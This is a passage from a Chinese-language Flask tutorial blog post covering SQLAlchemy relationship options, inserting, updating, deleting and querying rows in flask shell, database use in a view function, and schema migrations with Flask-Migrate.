<li>db.relationship() 的第一个参数编码整个关系的另一端是哪个模型；backref 参数向 User 模型中添加一个 role 属性，从而定义反向关系。通过 User 实例的这个role属性可以获取对应的 Role 模型的对象</li>
</ul>
<p>数情况下，db.relationship() 都能自行找到关系中的外键，但有时却无法确定哪一列是外键。<br>例如，如果 User 模型中有两个或以上的列定义为 Role 模型的外键，SQLAlchemy 就不知道该使用哪一列。如果无法确定外键，就要为 db.relationship() 提供额外的参数。</p>
<p>常用的 SQLAlchemy 关系选项：</p>
<table>
<thead>
<tr>
<th>选项名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>backref</td>
<td>在关系的另一个模型中添加反向引用</td>
</tr>
<tr>
<td>primaryjoin</td>
<td>明确指定两个模型之间使用的联结条件；只在模棱两可的关系中需要指定</td>
</tr>
<tr>
<td>lazy</td>
<td>指定如何加载相关记录，可选值有 select （首次访问时按需加载）、 immediate （源对象加载后就加载）、 joined（加载记录，但使用联结）、 subquery （立即加载，但使用子查询）， noload （永不加载）和 dynamic （不加载记录，但提供加载记录的查询）</td>
</tr>
<tr>
<td>uselist</td>
<td>如果设为 False ，不使用列表，而使用标量值</td>
</tr>
<tr>
<td>order_by</td>
<td>指定关系中记录的排序方式</td>
</tr>
<tr>
<td>secondary</td>
<td>指定多对多关系中关联表的名称</td>
</tr>
<tr>
<td>secondaryjoin</td>
<td>SQLAlchemy 无法自行决定时，指定多对多关系中的二级联结条件</td>
</tr>
</tbody>
</table>
<p>除了一对多关系之外：</p>
<ul>
<li>一对一 关系可以用一对多关系表示，但调用 <code>db.relationship()</code> 时要把 <code>uselist</code> 设为 False ，把“多”变成“一”。</li>
<li>多对一 关系也可使用一对多表示，对调两个表即可，或者把外键和 <code>db.relationship()</code> 都放在“多”这一侧。</li>
<li>最复杂的关系类型是多对多 ，需要用到第三张表，这个表称为关联表（或联结表 ）。</li>
</ul>
<p>&lt;br&gt;</p>
<h3 id="四、数据库操作"><a href="#四、数据库操作" class="headerlink" title="四、数据库操作"></a>四、数据库操作</h3><p>为了方便学习，我们先再Python shell中实际操作数据库模型，先将 FLASK_APP 环境变量设为 hellp.py，然后再虚拟环境终端中使用 <code>flask shell</code> 命令启动。</p>
<h5 id="4-1-创建表"><a href="#4-1-创建表" class="headerlink" title="4.1 创建表"></a>4.1 创建表</h5><p>首先要让 Flask-SQLAlchemy 根据模型类创建数据库。 <code>db.create_all()</code> 函数将寻找所有 <code>db.Model</code> 的子类，然后再数据库中创建对应的表：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hello <span class="keyword">import</span> db</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.create_all()</span><br></pre></td></tr></table></figure>
<p>执行完上面命令后，在应用目录中就会产生一个 data.sqlite文件。</p>
<p>如果数据库表已经存在于数据库中，那么 <code>db.create_all()</code> 不会重新创建或者更新相应的表。使用 <code>db.drop_all()</code> 可以删除旧表，然后再重新创建，这样可以更新数据库，但是并不推荐，因为会丢失原有的数据。</p>
<h5 id="4-2-插入行"><a href="#4-2-插入行" class="headerlink" title="4.2 插入行"></a>4.2 插入行</h5><p>（1）创建一些角色和用户如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hello <span class="keyword">import</span> Role, User</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_role = Role(name=<span class="string">'Admin'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mod_role = Role(name=<span class="string">'Moderator'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_role = Role(name=<span class="string">'User'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_john = User(username=<span class="string">'john'</span>, role=admin_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_susan = User(username=<span class="string">'susan'</span>, role=user_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_david = User(username=<span class="string">'david'</span>, role=user_role)</span><br></pre></td></tr></table></figure>
<ul>
<li>模型的构造函数接受的参数是使用关键字参数指定的模型属性初始值。</li>
<li>role 属性也可使用，虽然它不是真正的数据库列，但却是一对多关系的高级表示。</li>
<li>id 属性为主键，通常有数据库自身管理。而现在这些对象只存在于 Python 中，还未写入数据库，因此 id 并未赋值。</li>
</ul>
<p>（2）对数据库的改动通过数据库会话（也称事务）管理，由 <code>db.session</code> 表示。准备把对象写入数据库之前，要先将其添加到会话中：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(admin_role) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(mod_role) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_role) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_john) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_susan) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(user_david)</span><br></pre></td></tr></table></figure>
<p>也可以简写成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add_all([admin_role, mod_role, user_role, user_john, user_susan, user_david])</span><br></pre></td></tr></table></figure>
<p>（3）然后我们调用 <code>commit()</code> 方法提交会话，这样对象才被真正写入了数据库。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br></pre></td></tr></table></figure>
<p>（4）数据库会话（事务）可以保证数据库的一致性。提交操作使用原子方式把会话中的对象全部写入数据库。如果在写入会话的过程中发生了错误，那么整个会话都会失效。如果你始终把相关改动放在会话中提交，就能避免因部分更新导致的数据库不一致。</p>
<p>数据库会话也可以调用 <code>db.session.rollback()</code> 进行回滚，回滚后添加到数据库会话中的所有对象都将还原到它们在数据库中的状态。</p>
<h5 id="4-3-修改行"><a href="#4-3-修改行" class="headerlink" title="4.3 修改行"></a>4.3 修改行</h5><p>在数据库会话上调用 <code>add()</code> 方法也可以更新模型，如将 <code>Admin</code> 角色重命名未 <code>Administrator</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_role.name = <span class="string">'Administrator'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(admin_role) </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br><span class="line">&gt;&gt;&gt;&gt; admin_role.name       </span><br><span class="line"><span class="string">'Administrator'</span></span><br></pre></td></tr></table></figure>
<h5 id="4-4-删除行"><a href="#4-4-删除行" class="headerlink" title="4.4 删除行"></a>4.4 删除行</h5><p>数据库会话可以用 <code>delete()</code> 方法来删除数据，如将 <code>Moderator</code> 角色从数据库中删除：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.delete(mod_role)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br></pre></td></tr></table></figure>
<p>删除与插入和更新一样，只有提交数据库会话后才会执行。</p>
<h5 id="4-5-查询行"><a href="#4-5-查询行" class="headerlink" title="4.5 查询行"></a>4.5 查询行</h5><p>（1）Flask-SQLAlchemy 为每个模型类都提供了 query 对象。最基本的模型查询是使用 <code>all()</code> 方法取回对应表中所有记录：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Role.query.all()</span><br><span class="line">[&amp;lt;Role <span class="string">'Administrator'</span>&gt;, &amp;lt;Role <span class="string">'User'</span>&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>User.query.all()</span><br><span class="line">[&amp;lt;User <span class="string">'john'</span>&gt;, &amp;lt;User <span class="string">'susan'</span>&gt;, &amp;lt;User <span class="string">'david'</span>&gt;]</span><br></pre></td></tr></table></figure>
<p>使用过滤器可以配置 query 对象来进行更精准的数据库查询，如查找角色为 “User” 的所有用户：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>User.query.filter_by(role=user_role).all()</span><br><span class="line">[&amp;lt;User <span class="string">'susan'</span>&gt;, &amp;lt;User <span class="string">'david'</span>&gt;]</span><br></pre></td></tr></table></figure>
<p>若想查看 SQLAlchemy 为查询生成的原生SQL语句，可以将 query 对象转换为字符串：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(User.query.filter_by(role=user_role))</span><br><span class="line"><span class="string">'SELECT users.id AS users_id, users.username AS users_username, users.role_id AS users_role_id \nFROM users \nWHERE ? = users.role_id'</span></span><br></pre></td></tr></table></figure>
<p>如果退出了当前 shell，再重新打开的化，前面例子创建的对象就不会以 Python 对象的方式存在，只能从数据库表中进行读取，重新创建Python对象。如下例发起一个查询，加载名为“User” 的用户角色：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_role = Role.query.filter_by(name=<span class="string">'User'</span>).first()</span><br></pre></td></tr></table></figure>
<ul>
<li>first() 方法只返回第一个结果，如果没有结果的化，返回None。</li>
<li>all() 方法以列表的形式返回查询到的所有结果。</li>
</ul>
<p>（2）常用的 SQLAlchemy 查询过滤器：</p>
<table>
<thead>
<tr>
<th>过滤器</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>filter()</td>
<td>把过滤器添加到原查询上，返回一个新查询</td>
</tr>
<tr>
<td>filter_by()</td>
<td>把等值过滤器添加到原查询上，返回一个新查询</td>
</tr>
<tr>
<td>limit()</td>
<td>使用指定的值限制原查询返回的结果数量，返回一个新查询</td>
</tr>
<tr>
<td>offset()</td>
<td>偏移原查询返回的结果，返回一个新查询</td>
</tr>
<tr>
<td>order_by()</td>
<td>根据指定条件对原查询结果进行排序，返回一个新查询</td>
</tr>
<tr>
<td>group_by()</td>
<td>根据指定条件对原查询结果进行分组，返回一个新查询</td>
</tr>
</tbody>
</table>
<p>（3）常用的 SQLAlchemy 查询执行方法：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>all()</td>
<td>以列表形式返回查询的所有结果</td>
</tr>
<tr>
<td>first()</td>
<td>返回查询的第一个结果，如果没有结果，则返回 None</td>
</tr>
<tr>
<td>first_or_404()</td>
<td>返回查询的第一个结果，如果没有结果，则终止请求，返回 404 错误响应</td>
</tr>
<tr>
<td>get()</td>
<td>返回指定主键对应的行，如果没有对应的行，则返回 None</td>
</tr>
<tr>
<td>get_or_404()</td>
<td>返回指定主键对应的行，如果没找到指定的主键，则终止请求，返回 404 错误响应</td>
</tr>
<tr>
<td>count()</td>
<td>返回查询结果的数量</td>
</tr>
<tr>
<td>paginate()</td>
<td>返回一个 Paginate 对象，包含指定范围内的结果</td>
</tr>
</tbody>
</table>
<p>（4）关系与查询的处理方式类似，下面的例子首先查询角色为 User 的用户有哪些，然后又查询了用户susan的角色是什么，分别从关系的两端查询角色和用户之间的一对多关系。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>users = user_role.users</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>users</span><br><span class="line">[&amp;lt;User <span class="string">'susan'</span>&gt;, &amp;lt;User <span class="string">'david'</span>&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>users[<span class="number">0</span>].role</span><br><span class="line">&amp;lt;Role <span class="string">'User'</span>&gt;</span><br></pre></td></tr></table></figure>
<p>可以发现这里再执行 <code>user_role.users</code>时，隐式的调用了 <code>all()</code>方法，此时 query 对象被隐藏了，这样就无法再使用过滤器进行更精准的查询（如将结果按字母顺序排序）。</p>
<p>要想解决这个问题，我们需要在 Role 类的 <code>db.relationship()</code> 方法中加入 <code>lazy=&#39;dynamic&#39;</code> 参数的设置，从而禁止自动执行查询。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>, lazy=<span class="string">'dynamic'</span>)</span><br><span class="line">	<span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>这样配置关系之后，user_role.users 将返回一个尚未执行的查询，因此可以在其上添加过滤器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_role.users.order_by(User.username).all()</span><br><span class="line">[&amp;lt;User <span class="string">'david'</span>&gt;, &amp;lt;User <span class="string">'susan'</span>&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>user_role.users.count()</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="五、在视图函数中操作数据库"><a href="#五、在视图函数中操作数据库" class="headerlink" title="五、在视图函数中操作数据库"></a>五、在视图函数中操作数据库</h3><p>实际上，上面介绍一系列数据库操作可以直接在视图函数中进行，如下例hello.py：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'I am Lethe'</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_DATABASE_URI'</span>] = <span class="string">'sqlite:///'</span> + \</span><br><span class="line">    os.path.join(basedir, <span class="string">'data.sqlite'</span>)</span><br><span class="line">app.config[<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line">moment = Moment(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'roles'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    users = db.relationship(<span class="string">'User'</span>, backref=<span class="string">'role'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;Role %r&gt;'</span> % self.name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'users'</span></span><br><span class="line">    id = db.Column(db.Integer, primary_key=<span class="literal">True</span>)</span><br><span class="line">    username = db.Column(db.String(<span class="number">64</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    role_id = db.Column(db.Integer, db.ForeignKey(<span class="string">'roles.id'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&amp;lt;User %r&gt;'</span> % self.username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = User.query.filter_by(username=form.name.data).first()</span><br><span class="line">        <span class="comment"># 根据输入的数据查询数据库</span></span><br><span class="line">        <span class="comment">#user = User.query.filter_by(username=form.name.data).first()</span></span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 若数据库没有该用户，则添加该用户</span></span><br><span class="line">            user = User(username=form.name.data)</span><br><span class="line">            db.session.add(user)</span><br><span class="line">            db.session.commit()</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'known'</span>] = <span class="literal">True</span></span><br><span class="line">        session[<span class="string">'name'</span>] = form.name.data</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,</span><br><span class="line">                           form=form, name=session.get(<span class="string">'name'</span>),</span><br><span class="line">                           known=session.get(<span class="string">'known'</span>, <span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
<p>这个例子在提交表单后，会先查询数据库来判断该用户是否存在，若不存在，则添加该新用户，且<code>session[&#39;known&#39;]</code>为False，若存在，则<code>session[&#39;known&#39;]</code>为True。</p>
<p>然后我们可以将 known 传给模板，模板可以根据是否为老用户来生成不同的消息，如下templates/index.html：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% extends <span class="string">"base.html"</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">import</span> <span class="string">"bootstrap/wtf.html"</span> <span class="keyword">as</span> wtf %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line">&amp;lt;div class="page-header"&gt;</span><br><span class="line">    &amp;lt;h1&gt;Hello, &#123;% <span class="keyword">if</span> name %&#125;&#123;&#123; name &#125;&#125;&#123;% <span class="keyword">else</span> %&#125;Stranger&#123;% endif %&#125;!&amp;lt;/h1&gt;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="keyword">not</span> known %&#125;</span><br><span class="line">    &amp;lt;p&gt;Pleased to meet you!&amp;lt;/p&gt;</span><br><span class="line">    &#123;% <span class="keyword">else</span> %&#125;</span><br><span class="line">    &amp;lt;p&gt;Happy to see you again!&amp;lt;/p&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&amp;lt;/div&gt;</span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
<p>第一次提交：<br><img src="/2020/02/01/Flask-Notes/20200131163921967.png" alt="在这里插入图片描述"></p>
<p>再次提交：<br><img src="/2020/02/01/Flask-Notes/20200131163954957.png" alt="在这里插入图片描述"><br>也可以在数据库中的用户表中新加一列，用来存储每个用户的欢迎消息，在查询该用户时，取出对应的欢迎消息传给模板，从而显示定制的消息，在后面讲了数据库更新之后再来实现。</p>
<p>&lt;br&gt;</p>
<h3 id="六、集成Python-shell"><a href="#六、集成Python-shell" class="headerlink" title="六、集成Python shell"></a>六、集成Python shell</h3><p>每次启动 shell 会话都要导入数据库实例和模型，为了避免一直重复导入，可以做些配置让 flask shell 命令自动导入这些对象。</p>
<p>若想把对象添加到导入列表中，必须使用 <code>app.shell_context_processor</code> 装饰器创建并注册一个 shell 上下文处理器如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.shell_context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_shell_context</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> dict(db=db, User=User, Role=Role)</span><br></pre></td></tr></table></figure>
<p>这个 shell 上下文处理器函数返回一个字典，包含数据库实例和模型。除了默认导入的 app 之外，flask shell 命令将自动把这些对象导入shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>app</span><br><span class="line">&amp;lt;Flask <span class="string">'hello'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db</span><br><span class="line">&amp;lt;SQLAlchemy engine=sqlite:///F:\MyCode\Python\FlaskWebLearn\flasky\data.sqlite&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>User</span><br><span class="line">&amp;lt;<span class="class"><span class="keyword">class</span> '<span class="title">hello</span>.<span class="title">User</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Role</span></span></span><br><span class="line">&amp;lt;class 'hello.Role'&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Role.query.all()</span><br><span class="line">[&amp;lt;Role <span class="string">'Administrator'</span>&gt;, &amp;lt;Role <span class="string">'User'</span>&gt;]</span><br></pre></td></tr></table></figure>
<p>&lt;br&gt;</p>
<h3 id="七、使用Flask-Migrate实现数据库迁移"><a href="#七、使用Flask-Migrate实现数据库迁移" class="headerlink" title="七、使用Flask-Migrate实现数据库迁移"></a>七、使用Flask-Migrate实现数据库迁移</h3><p>有时需要修改数据库模型，而且修改之后还要更新数据库，但是前面说了当数据库表已经存在的时候，不会再创建模型了，只能删掉旧表后再重新创建，这样显然不好。</p>
<p>因此更好的方法就是使用<strong>数据库迁移框架</strong>，数据库迁移框架能跟踪数据库模式 的变化，然后以增量的方式把变化应用到数据库中。</p>
<p>SQLAlchemy 的开发人员编写了一个迁移框架，名为 Alembic。除了直接使用 Alembic 之外，Flask 应用还可使用 Flask-Migrate 扩展。这个扩展是对 Alembic 的轻量级包装，并与 flask 命令做了集成。首先在虚拟环境中安装此扩展：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-migrate</span><br></pre></td></tr></table></figure>
<h5 id="7-1-创建迁移仓库"><a href="#7-1-创建迁移仓库" class="headerlink" title="7.1 创建迁移仓库"></a>7.1 创建迁移仓库</h5><p>此扩展在使用前同样需要先初始化：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">migrate = Migrate(app, db)</span><br></pre></td></tr></table></figure>
<p>为了开放数据库迁移相关的命令，Flask-Migrate 添加了 flask db 命令和几个子命令。在新项目中可以使用 init 子命令添加数据库迁移支持，这个命令会创建 migrations 目录，所有迁移脚本都存放在这里。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(venv) PS F:\MyCode\Python\FlaskWebLearn\flasky&gt; flask db init       </span><br><span class="line">Creating directory F:\MyCode\Python\FlaskWebLearn\flasky\migrations ...  <span class="keyword">done</span></span><br><span class="line">Creating directory F:\MyCode\Python\FlaskWebLearn\flasky\migrations\versions ...  <span class="keyword">done</span></span><br><span class="line">Generating F:\MyCode\Python\FlaskWebLearn\flasky\migrations\alembic.ini ...  <span class="keyword">done</span></span><br><span class="line">Generating F:\MyCode\Python\FlaskWebLearn\flasky\migrations\env.py ...  <span class="keyword">done</span></span><br><span class="line">Generating F:\MyCode\Python\FlaskWebLearn\flasky\migrations\README ...  <span class="keyword">done</span></span><br><span class="line">Generating F:\MyCode\Python\FlaskWebLearn\flasky\migrations\script.py.mako ...  <span class="keyword">done</span></span><br><span class="line">Please edit configuration/connection/logging settings <span class="keyword">in</span> <span class="string">'F:\\MyCode\\Python\\FlaskWebLearn\\flasky\\migrations\\alembic.ini'</span> before proceeding.</span><br></pre></td></tr></table></figure>
<h5 id="7-2-创建迁移脚本"><a href="#7-2-创建迁移脚本" class="headerlink" title="7.2 创建迁移脚本"></a>7.2 创建迁移脚本</h5><p>（1）在 Alembic 中，数据库迁移用迁移脚本表示，迁移脚本有两个函数，分别是<code>upgrade()</code> 和 <code>downgrade()</code>。</p>
<ul>
<li>upgrade() 函数把迁移中的改动应用到数据库中</li>
<li>downgrade() 函数则将改动删除</li>
</ul>
<p>我们可以使用 revision 命令手动创建 Alembic 迁移，也可使用migrate 命令自动创建。</p>
<ul>
<li>手动创建的迁移只是一个骨架，upgrade() 和 downgrade() 函数都是空的，开发者要使用 Alembic 提供的Operations 对象指令实现具体操作。</li>
<li>自动创建的迁移会根据模型定义和数据库当前状态之间的差异尝试生成 upgrade() 和 downgrade() 函数的内容。</li>
<li>自动创建的迁移不一定总是正确的，可能会漏掉一些细节，因此自动生成迁移脚本后一定要进行检查。</li>
</ul>
<p>（2）使用 Flask-Migrate 管理数据库模式变化的步骤如下：<br>① 对模型类做必要的修改。<br>② 执行 <code>flask db migrate</code> 命令，自动创建一个迁移脚本。<br>③ 检查自动生成的脚本，根据对模型的实际改动进行调整。<br>④ 把迁移脚本纳入版本控制。<br>⑤ 执行 <code>flask db upgrade</code> 命令，把迁移应用到数据库中。</p>
<p>例如我们想在 User 表中加入一列 message，先在 User 类中加入 message 属性：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">    message = db.Column(db.Text)</span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>然后使用 flask db migrate 命令自动创建迁移脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(venv) PS F:\MyCode\Python\FlaskWebLearn\flasky&gt; flask db migrate -m <span class="string">"initial migration"</span></span><br><span class="line">INFO  [alembic.runtime.migration] Context impl SQLiteImpl.</span><br><span class="line">INFO  [alembic.runtime.migration] Will assume non-transactional DDL. </span><br><span class="line">INFO  [alembic.autogenerate.compare] Detected added column <span class="string">'users.message'</span></span><br><span class="line">Generating F:\MyCode\Python\FlaskWebLearn\flasky\migrations\versions\2ad03fb29744_initial_migration.py ...  <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<h5 id="7-3-更新数据库"><a href="#7-3-更新数据库" class="headerlink" title="7.3 更新数据库"></a>7.3 更新数据库</h5><p>（1）检查并修正好迁移脚本之后，执行 flask db upgrade 命令，把迁移应用到数据库中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(venv) PS F:\MyCode\Python\FlaskWebLearn\flasky&gt; flask db upgrade    </span><br><span class="line">INFO  [alembic.runtime.migration] Context impl SQLiteImpl.</span><br><span class="line">INFO  [alembic.runtime.migration] Will assume non-transactional DDL. </span><br><span class="line">INFO  [alembic.runtime.migration] Running upgrade  -&gt; 2ad03fb29744, initial migration</span><br></pre></td></tr></table></figure>
<p>（2）这时User表中已经增加了一列message，然后启动 flask shell，分别为 admin和 Lethe 用户添加 message 数据表示各自的定制消息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_user = User.query.filter_by(username=<span class="string">'admin'</span>).first()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lethe_user = User.query.filter_by(username=<span class="string">'Lethe'</span>).first()   </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>admin_user.message = <span class="string">'You are the admin, you can do anything!'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>lethe_user.message = <span class="string">'Hello Lethe, Welcome Back!'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(admin_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.add(lethe_user)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>db.session.commit()</span><br></pre></td></tr></table></figure>
<p>（3）然后修改hello.py 中的视图函数，使其能够为 admin 和 Lethe 用户显示各自定制的消息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, session, redirect, url_for, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_moment <span class="keyword">import</span> Moment</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">from</span> flask_migrate <span class="keyword">import</span> Migrate</span><br><span class="line"></span><br><span class="line">basedir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"></span><br><span class="line">app = 